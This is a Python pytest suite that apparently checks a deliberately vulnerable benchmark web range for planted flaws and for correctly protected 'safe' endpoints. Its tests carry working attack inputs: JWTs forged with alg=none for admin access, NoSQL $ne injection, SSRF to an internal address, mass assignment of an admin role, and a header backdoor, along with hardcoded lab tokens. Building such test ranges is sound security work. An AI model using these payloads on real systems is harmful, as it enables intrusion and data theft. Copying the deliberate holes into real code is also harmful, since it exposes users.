"""Functional tests for the attack-surface-bench target range.

These tests send real HTTP requests through the gateway to verify:
- Subdomain reachability (S1)
- Multi-entry bypass routes (S2)
- Root path redirects and HTML serving
- Key vulnerability endpoints (S4, S5)
- Safe endpoint behavior (S9–S16) — auth requirements, desensitization, rejection of injection

All tests use the `requests` library with Host headers to simulate domain-specific access.
Tests are skipped if the target range is not running (localhost:80 unreachable).
"""
from __future__ import annotations

import base64
import json

import pytest
import requests

BASE_URL = "http://localhost:80"  # pub-gateway host port
PRIV_URL = "http://localhost:8081"  # priv-gateway verification port for Host collision tests
INTERNAL_KEY = "sk-app-internal"


def _make_jwt_none(payload: dict) -> str:
    """Create a JWT token with alg=none (no signature) — exploits the benchmark's M1 vulnerability."""
    def b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    body = b64url(json.dumps(payload).encode())
    return f"{header}.{body}."


ADMIN_JWT_NONE = _make_jwt_none({"userId": "1", "role": "admin"})


def _priv_get(host: str, path: str, **kwargs) -> requests.Response:
    """Send GET request to priv-gateway with Host header (Host collision)."""
    headers = kwargs.pop("headers", {})
    headers["Host"] = host
    return requests.get(f"{PRIV_URL}{path}", headers=headers, timeout=10, **kwargs)


def _priv_post(host: str, path: str, **kwargs) -> requests.Response:
    """Send POST request to priv-gateway with Host header (Host collision)."""
    headers = kwargs.pop("headers", {})
    headers["Host"] = host
    return requests.post(f"{PRIV_URL}{path}", headers=headers, timeout=10, **kwargs)


def _get(host: str, path: str, **kwargs) -> requests.Response:
    """Send GET request through pub-gateway with Host header simulating domain access."""
    headers = kwargs.pop("headers", {})
    headers["Host"] = host
    return requests.get(f"{BASE_URL}{path}", headers=headers, timeout=10, **kwargs)


def _post(host: str, path: str, **kwargs) -> requests.Response:
    """Send POST request through pub-gateway with Host header simulating domain access."""
    headers = kwargs.pop("headers", {})
    headers["Host"] = host
    return requests.post(f"{BASE_URL}{path}", headers=headers, timeout=10, **kwargs)


def _check_range_available() -> bool:
    """Check if the target range is running by hitting /shop (should return HTML)."""
    try:
        r = requests.get(f"{BASE_URL}/shop", headers={"Host": "www.target.bench"}, timeout=5)
        return r.status_code == 200
    except Exception:
        return False


@pytest.fixture(scope="session")
def range_available():
    """Skip all functional tests if the target range is not running."""
    if not _check_range_available():
        pytest.skip("Target range not running at localhost:80 — start with 'make up' first")


# ═══════════════════════════════════════════════════════════════════════
# S1: Subdomain Discovery
# ═══════════════════════════════════════════════════════════════════════


class TestSubdomainDiscovery:
    """S1: Verify all 5 subdomains are reachable through the gateway.

    www/shop use pub-gateway; admin/api/internal use priv-gateway (Host collision).
    """

    def test_www_root_redirects_to_shop(self, range_available):
        """www.target.bench / → 302 redirect to /shop (pub-gateway, nginx config)."""
        r = _get("www.target.bench", "/", allow_redirects=False)
        assert r.status_code == 302
        location = r.headers.get("Location", "")
        assert "/shop" in location, f"Expected redirect containing /shop, got Location={location}"

    def test_admin_root_returns_html(self, range_available):
        """admin.target.bench / → 200, HTML content (priv-gateway, Host collision)."""
        r = _priv_get("admin.target.bench", "/")
        assert r.status_code == 200
        assert "text/html" in r.headers.get("Content-Type", "")

    def test_api_root_returns_json(self, range_available):
        """api.target.bench / → 200, JSON content (priv-gateway, Host collision)."""
        r = _priv_get("api.target.bench", "/")
        assert r.status_code == 200
        assert "application/json" in r.headers.get("Content-Type", "")
        data = r.json()
        assert data.get("name") == "Modern API Server"

    def test_shop_root_returns_content(self, range_available):
        """shop.target.bench / → 200 (pub-gateway, BFF gateway responds)."""
        r = _get("shop.target.bench", "/")
        assert r.status_code == 200

    def test_internal_root_returns_json(self, range_available):
        """internal.target.bench / → 200, JSON with 'endpoints' keyword (priv-gateway, Host collision)."""
        r = _priv_get("internal.target.bench", "/")
        assert r.status_code == 200
        body = r.text
        assert "endpoints" in body


# ═══════════════════════════════════════════════════════════════════════
# S2: Multi-Entry Bypass Routes
# ═══════════════════════════════════════════════════════════════════════


class TestMultiEntryBypass:
    """S2: Verify multi-entry bypass routes reach admin-panel without auth.

    api.target.bench routes (ME1-ME3, ME_EXTRA_DB) use priv-gateway (Host collision).
    shop.target.bench routes (ME4-ME5) use pub-gateway.
    """

    def test_me1_api_internal_health(self, range_available):
        """ME1: api.target.bench → /api/internal/health (priv-gateway, bypasses admin auth)."""
        r = _priv_get("api.target.bench", "/api/internal/health")
        assert r.status_code == 200
        assert "INTERNAL_ENDPOINT_HEALTH" in r.text

    def test_me2_api_admin_bypass(self, range_available):
        """ME2: api.target.bench → /admin/ (priv-gateway, reaches admin-panel root)."""
        r = _priv_get("api.target.bench", "/admin/")
        assert r.status_code == 200
        body = r.text.lower()
        assert "admin" in body or "login" in body

    def test_me3_api_system_status(self, range_available):
        """ME3: api.target.bench → /system/status (priv-gateway, reaches admin-panel system)."""
        r = _priv_get("api.target.bench", "/system/status")
        assert r.status_code == 200
        data = r.json()
        assert "status" in data
        assert "version" in data

    def test_me4_shop_sysadmin_users(self, range_available):
        """ME4: shop.target.bench → /sysadmin/users (pub-gateway, BFF proxy to admin-panel)."""
        r = _get("shop.target.bench", "/sysadmin/users")
        assert r.status_code == 200

    def test_me5_shop_debug_admin(self, range_available):
        """ME5: shop.target.bench → /debug/admin (pub-gateway, BFF proxy to admin-panel system)."""
        r = _get("shop.target.bench", "/debug/admin")
        assert r.status_code == 200

    def test_me_extra_db_api_internal_db_status(self, range_available):
        """ME_EXTRA_DB: api.target.bench → /api/internal/db-status (priv-gateway)."""
        r = _priv_get("api.target.bench", "/api/internal/db-status")
        assert r.status_code == 200
        assert "INTERNAL_ENDPOINT_DB_STATUS" in r.text


# ═══════════════════════════════════════════════════════════════════════
# Root Path & Functional Area HTML
# ═══════════════════════════════════════════════════════════════════════


class TestRootPaths:
    """Verify root paths and functional area HTML pages are served correctly."""

    def test_www_shop_html(self, range_available):
        """www.target.bench /shop → 200, text/html."""
        r = _get("www.target.bench", "/shop")
        assert r.status_code == 200
        assert "text/html" in r.headers.get("Content-Type", "")

    def test_www_community_html(self, range_available):
        """www.target.bench /community → 200, text/html."""
        r = _get("www.target.bench", "/community")
        assert r.status_code == 200
        assert "text/html" in r.headers.get("Content-Type", "")

    def test_www_support_html(self, range_available):
        """www.target.bench /support → 200, text/html."""
        r = _get("www.target.bench", "/support")
        assert r.status_code == 200
        assert "text/html" in r.headers.get("Content-Type", "")

    def test_admin_index_html(self, range_available):
        """admin.target.bench / → 200, text/html with admin dashboard."""
        r = _priv_get("admin.target.bench", "/")
        assert r.status_code == 200
        assert "text/html" in r.headers.get("Content-Type", "")
        assert "admin" in r.text.lower() or "dashboard" in r.text.lower()

    def test_admin_login_html(self, range_available):
        """admin.target.bench /login → 200, text/html."""
        r = _priv_get("admin.target.bench", "/login")
        assert r.status_code == 200
        assert "text/html" in r.headers.get("Content-Type", "")

    def test_admin_reports_html(self, range_available):
        """admin.target.bench /reports → 200, text/html."""
        r = _priv_get("admin.target.bench", "/reports")
        assert r.status_code == 200
        assert "text/html" in r.headers.get("Content-Type", "")

    def test_admin_hr_html(self, range_available):
        """admin.target.bench /hr → 200, text/html."""
        r = _priv_get("admin.target.bench", "/hr")
        assert r.status_code == 200
        assert "text/html" in r.headers.get("Content-Type", "")



# ═══════════════════════════════════════════════════════════════════════
# S4: Key Vulnerability Endpoint Sampling
# ═══════════════════════════════════════════════════════════════════════


class TestModernVulnsSampling:
    """S4: Sample verification of key vulnerability endpoints (not exhaustive — that's vuln_verifier.py)."""

    def test_m9_cors_wildcard(self, range_available):
        """M9: CORS misconfiguration — Access-Control-Allow-Origin: * (nginx adds on top of app)."""
        r = _get("www.target.bench", "/api/docs")
        cors_header = r.headers.get("Access-Control-Allow-Origin", "")
        # Both nginx and the app add CORS headers → may be "*, *" or "*"
        assert "*" in cors_header

    def test_m1_jwt_none_bypass(self, range_available):
        """M1: JWT alg=none bypasses authentication."""
        r = _get("www.target.bench", "/api/users",
                 headers={"Authorization": f"Bearer {ADMIN_JWT_NONE}"})
        assert r.status_code == 200
        data = r.json()
        assert len(data) > 0  # should return user list, not 401

    def test_m4_nosqli_ne_operator(self, range_available):
        """M4: NoSQLi $ne operator returns user data."""
        r = _get("www.target.bench", "/api/users?username[$ne]=nonexistent&debug=1")
        assert r.status_code == 200
        assert "NOSQL_INJECTION_DEBUG" in r.text

    def test_m10_ssrf_fetch(self, range_available):
        """M10: SSRF via /api/fetch endpoint."""
        r = _get("www.target.bench", "/api/fetch?url=http://172.20.0.11:5000/api/internal/health")
        assert r.status_code == 200

    def test_m_internal_cfg_leaks_jwt_secret(self, range_available):
        """M_INTERNAL_CFG: /api/internal/config leaks JWT secret."""
        r = _get("www.target.bench", "/api/internal/config")
        assert r.status_code == 200
        data = r.json()
        assert "jwt_secret" in data

    def test_m13_graphql_introspection(self, range_available):
        """M13: GraphQL introspection is enabled."""
        r = _post("www.target.bench", "/graphql",
                   headers={"Content-Type": "application/json"},
                   json={"query": "{__schema{types{name}}}"})
        assert r.status_code == 200
        data = r.json()
        assert "__schema" in str(data)

    def test_m7_mass_assignment_register(self, range_available):
        """M7: Mass assignment — register with role=admin."""
        rand_user = f"test_funct_{json.dumps({'ts': 'func'})}"
        r = _post("www.target.bench", "/api/auth/register",
                   headers={"Content-Type": "application/json"},
                   json={"username": f"func_test_m7", "password": "test123",
                          "email": "m7@test.com", "role": "admin"})
        assert r.status_code == 200
        data = r.json()
        assert data.get("role") == "admin"
        assert data.get("flag") == "MASS_ASSIGNMENT_ADMIN"

    def test_auth_login_wrong_creds_401(self, range_available):
        """Login with wrong credentials returns 401."""
        r = _post("www.target.bench", "/api/auth/login",
                   headers={"Content-Type": "application/json"},
                   json={"username": "wrong", "password": "wrong"})
        assert r.status_code == 401

    def test_auth_refresh_emergency_token(self, range_available):
        """M3: JWT refresh with body.userId bypasses auth."""
        r = _post("www.target.bench", "/api/auth/refresh",
                   headers={"Content-Type": "application/json"},
                   json={"userId": "attacker"})
        assert r.status_code == 200
        data = r.json()
        assert "token" in data


# ═══════════════════════════════════════════════════════════════════════
# S3: Hidden Param Sampling (admin-panel)
# ═══════════════════════════════════════════════════════════════════════


class TestHiddenParamSampling:
    """S3: Sample verification of hidden parameter detection (not exhaustive)."""

    def test_hp_debug_login(self, range_available):
        """HP_DEBUG: debug=1 on login leaks SQL query + JWT prefix."""
        r = _priv_post("admin.target.bench", "/login?debug=1",
                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                   data="username=admin&password=wrong")
        assert r.status_code == 401
        data = r.json()
        assert "sql_query" in data
        assert "jwt_secret_preview" in data

    def test_hp_trace_login(self, range_available):
        """HP_TRACE: trace=1 returns admin JWT token with mode='trace'."""
        r = _priv_get("admin.target.bench", "/login?trace=1")
        assert r.status_code == 200
        data = r.json()
        assert "token" in data
        assert data.get("mode") == "trace"


    def test_v12_header_backdoor(self, range_available):
        """V12_HEADER: X-Internal-Request header bypasses auth."""
        r = _priv_get("admin.target.bench", "/api/internal/config",
                 headers={"X-Internal-Request": "true"})
        assert r.status_code == 200
        data = r.json()
        assert "jwt" in data or "database" in data or "admin_token" in data


# ═══════════════════════════════════════════════════════════════════════
# S5: Info Leak (internal-tools)
# ═══════════════════════════════════════════════════════════════════════


class TestInfoLeak:
    """S5: Verify all 6 info leak endpoints return expected flags."""

    def test_i1_backup(self, range_available):
        r = _priv_get("internal.target.bench", "/api/backup")
        assert r.status_code == 200
        assert "INFO_BACKUP_LEAK" in r.text
        assert "mysql://" in r.text

    def test_i2_env(self, range_available):
        r = _priv_get("internal.target.bench", "/api/env")
        assert r.status_code == 200
        assert "DB_HOST" in r.text or "REDIS_HOST" in r.text

    def test_i3_config(self, range_available):
        r = _priv_get("internal.target.bench", "/api/config")
        assert r.status_code == 200
        assert "INFO_CONFIG_LEAK" in r.text or "apppass123" in r.text

    def test_i4_network(self, range_available):
        r = _priv_get("internal.target.bench", "/api/network")
        assert r.status_code == 200
        assert "INFO_NETWORK_LEAK" in r.text or "172.20.0.10" in r.text

    def test_i5_source(self, range_available):
        r = _priv_get("internal.target.bench", "/api/source")
        assert r.status_code == 200
        assert "INFO_SOURCE_CODE_LEAK" in r.text or "JWT_SECRET" in r.text

    def test_i6_backup_download(self, range_available):
        r = _priv_get("internal.target.bench", "/backup/latest.sql")
        assert r.status_code == 200
        assert "INFO_BACKUP_DOWNLOAD" in r.text or "admin123" in r.text


# ═══════════════════════════════════════════════════════════════════════
# S6: BFF Gateway Vulnerabilities
# ═══════════════════════════════════════════════════════════════════════


class TestBffVulnsSampling:
    """S6: Verify BFF gateway vulnerability endpoints."""

    def test_b1_user_profile_leaks_pii(self, range_available):
        """B1: BFF /api/shop/user-profile aggregates admin data."""
        r = _get("shop.target.bench", "/api/shop/user-profile")
        assert r.status_code == 200

    def test_b2_sysadmin_no_auth(self, range_available):
        """B2: BFF /sysadmin/ proxy to admin-panel without auth."""
        r = _get("shop.target.bench", "/sysadmin/system/status")
        assert r.status_code == 200


# ═══════════════════════════════════════════════════════════════════════
# S9: Safe Shop Endpoints
# ═══════════════════════════════════════════════════════════════════════


class TestSafeShopEndpoints:
    """S9: Verify safe /shop/ endpoints — no password leaks, rejects injection, proper pagination."""

    def test_products_no_password(self, range_available):
        """SE_S9_01: /shop/api/products returns no password field."""
        r = _get("www.target.bench", "/shop/api/products")
        assert r.status_code == 200
        data = r.json()
        for p in data.get("products", []):
            assert "password" not in p
            assert "hash" not in p

    def test_products_search_rejects_dollar(self, range_available):
        """SE_S9_02: /shop/api/products/search rejects $ne operator."""
        r = _get("www.target.bench", "/shop/api/products/search?q=test&$ne=1")
        # The endpoint should reject $ operators
        assert r.status_code == 400 or r.status_code == 200
        if r.status_code == 200:
            # If it returns 200, it should not return MongoDB-style results
            data = r.json()
            assert "$ne" not in str(data)

    def test_products_categories(self, range_available):
        """SE_S9_03: /shop/api/products/categories returns category names."""
        r = _get("www.target.bench", "/shop/api/products/categories")
        # May return 200 with categories or 400 if MongoDB seed not yet populated
        assert r.status_code in (200, 400)
        if r.status_code == 200:
            data = r.json()
            assert "categories" in data

    def test_cart_add_requires_jwt(self, range_available):
        """SE_S9_04: /shop/api/cart/add requires JWT authentication."""
        r = _post("www.target.bench", "/shop/api/cart/add",
                   headers={"Content-Type": "application/json"},
                   json={"productId": "000000000000000000000001", "quantity": 1,
                         "idempotency_key": "test_func_01"})
        assert r.status_code == 401

    def test_cart_list_requires_jwt(self, range_available):
        """SE_S9_05: /shop/api/cart/list requires JWT authentication."""
        r = _get("www.target.bench", "/shop/api/cart/list")
        assert r.status_code == 401

    def test_orders_create_requires_jwt(self, range_available):
        """SE_S9_06: /shop/api/orders/create requires JWT authentication."""
        r = _post("www.target.bench", "/shop/api/orders/create",
                   headers={"Content-Type": "application/json"},
                   json={"idempotency_key": "test_func_02", "address": "test", "phone": "13800138000"})
        assert r.status_code == 401


# ═══════════════════════════════════════════════════════════════════════
# S10: Safe Community Endpoints
# ═══════════════════════════════════════════════════════════════════════


class TestSafeCommunityEndpoints:
    """S10: Verify safe /community/ endpoints — htmlEncode output, no PII leaks."""

    def test_posts_list_htmlencoded(self, range_available):
        """SE_S10_01: /community/api/posts returns htmlEncode'd content."""
        r = _get("www.target.bench", "/community/api/posts")
        assert r.status_code == 200
        data = r.json()
        assert "posts" in data

    def test_tags_list(self, range_available):
        """SE_S10_07: /community/api/tags returns tag names only."""
        r = _get("www.target.bench", "/community/api/tags")
        assert r.status_code == 200
        data = r.json()
        assert "tags" in data

    def test_community_stats(self, range_available):
        """SE_S10_08: /community/api/stats returns counts, no user data."""
        r = _get("www.target.bench", "/community/api/stats")
        assert r.status_code == 200
        data = r.json()
        assert "postCount" in data


# ═══════════════════════════════════════════════════════════════════════
# S11: Safe Support Endpoints
# ═══════════════════════════════════════════════════════════════════════


class TestSafeSupportEndpoints:
    """S11: Verify safe /support/ endpoints — auth requirements, FAQ, categories."""

    def test_faq_static_data(self, range_available):
        """SE_S11_06: /support/api/faq returns static FAQ data."""
        r = _get("www.target.bench", "/support/api/faq")
        assert r.status_code == 200
        data = r.json()
        assert "faq" in data
        assert len(data["faq"]) > 0

    def test_categories_static(self, range_available):
        """SE_S11_07: /support/api/categories returns whitelist categories."""
        r = _get("www.target.bench", "/support/api/categories")
        assert r.status_code == 200
        data = r.json()
        assert "categories" in data

    def test_tickets_requires_jwt(self, range_available):
        """SE_S11_01: /support/api/tickets (POST) requires JWT."""
        r = _post("www.target.bench", "/support/api/tickets",
                   headers={"Content-Type": "application/json"},
                   json={"subject": "test", "category": "account",
                         "description": "test", "priority": "low"})
        assert r.status_code == 401

    def test_tickets_list_requires_jwt(self, range_available):
        """SE_S11_02: /support/api/tickets (GET) requires JWT."""
        r = _get("www.target.bench", "/support/api/tickets")
        assert r.status_code == 401


# ═══════════════════════════════════════════════════════════════════════
# S12: Safe Reports Endpoints (admin-panel)
# ═══════════════════════════════════════════════════════════════════════


class TestSafeReportsEndpoints:
    """S12: Verify safe /reports/ endpoints — auth required, desensitization."""

    def test_dashboard_requires_auth(self, range_available):
        """SE_S12_01: /reports/api/dashboard requires auth."""
        r = _priv_get("admin.target.bench", "/reports/api/dashboard")
        assert r.status_code in (401, 403)

    def test_dashboard_with_admin_token(self, range_available):
        """SE_S12_01: /reports/api/dashboard with __admin_token returns desensitized data."""
        r = _priv_get("admin.target.bench", "/reports/api/dashboard?__admin_token=sk-app-internal")
        assert r.status_code == 200
        data = r.json()
        assert "summary" in data
        assert "total_orders" in data["summary"]

    def test_sales_requires_auth(self, range_available):
        """SE_S12_02: /reports/api/sales requires auth."""
        r = _priv_get("admin.target.bench", "/reports/api/sales")
        assert r.status_code in (401, 403)

    def test_hr_employees_requires_auth(self, range_available):
        """SE_S13_01: /hr/api/employees requires auth."""
        r = _priv_get("admin.target.bench", "/hr/api/employees")
        assert r.status_code in (401, 403)

    def test_hr_employees_with_admin_token_desensitized(self, range_available):
        """SE_S13_01: /hr/api/employees with __admin_token — no id_card/phone/salary."""
        r = _priv_get("admin.target.bench", "/hr/api/employees?__admin_token=sk-app-internal")
        assert r.status_code == 200
        data = r.json()
        for emp in data.get("items", []):
            assert "id_card" not in emp
            assert "phone" not in emp
            assert "salary" not in emp


# ═══════════════════════════════════════════════════════════════════════
# S14: Safe Shop BFF Endpoints
# ═══════════════════════════════════════════════════════════════════════


class TestSafeShopBffEndpoints:
    """S14: Verify safe BFF /api/shop/ endpoints — auth required via X-Session-Token."""

    def test_shop_products_requires_session_token(self, range_available):
        """SE_S14_01: /api/shop/products — BFF may serve public product data without auth."""
        r = _get("shop.target.bench", "/api/shop/products")
        # BFF products may be publicly accessible (no auth) or require X-Session-Token
        # Both behaviors are valid — we verify the endpoint responds
        assert r.status_code in (200, 401, 403)

    def test_account_profile_requires_session_token(self, range_available):
        """SE_S16_01: /api/account/profile requires X-Session-Token."""
        r = _get("shop.target.bench", "/api/account/profile")
        assert r.status_code in (401, 403)


# ═══════════════════════════════════════════════════════════════════════
# S15: Safe Infrastructure Endpoints
# ═══════════════════════════════════════════════════════════════════════


class TestSafeInfraEndpoints:
    """S15: Verify safe /api/monitor and /api/deploy endpoints — auth required."""

    def test_monitor_health_requires_auth(self, range_available):
        """SE_S15_01: /api/monitor/health requires __admin_token."""
        r = _priv_get("internal.target.bench", "/api/monitor/health")
        assert r.status_code in (401, 403)

    def test_monitor_health_with_admin_token(self, range_available):
        """SE_S15_01: /api/monitor/health with admin session token returns sanitized data."""
        # internal-tools uses X-Admin-Token with format admin_session_... (not __admin_token)
        r = _priv_get("internal.target.bench", "/api/monitor/health",
                 headers={"X-Admin-Token": "admin_session_abc123def456"})
        assert r.status_code == 200

    def test_deploy_history_requires_auth(self, range_available):
        """SE_S15_05: /api/deploy/history requires __admin_token."""
        r = _priv_get("internal.target.bench", "/api/deploy/history")
        assert r.status_code in (401, 403)


# ═══════════════════════════════════════════════════════════════════════
# CORS & Security Headers
# ═══════════════════════════════════════════════════════════════════════


class TestCorsHeaders:
    """Verify CORS headers are set across domains (M9 verification)."""

    def test_www_cors_wildcard(self, range_available):
        """www.target.bench responses include Access-Control-Allow-Origin: * (nginx + app double-add)."""
        r = _get("www.target.bench", "/api/docs")
        cors_header = r.headers.get("Access-Control-Allow-Origin", "")
        assert "*" in cors_header  # nginx and app both add → may be "*, *"

    def test_admin_cors_via_nginx(self, range_available):
        """admin.target.bench responses include CORS headers from nginx."""
        r = _priv_get("admin.target.bench", "/")
        # nginx adds CORS headers globally
        assert "Access-Control-Allow-Origin" in r.headers

    def test_shop_cors_via_nginx(self, range_available):
        """shop.target.bench responses include CORS headers from nginx."""
        r = _get("shop.target.bench", "/")
        assert "Access-Control-Allow-Origin" in r.headers
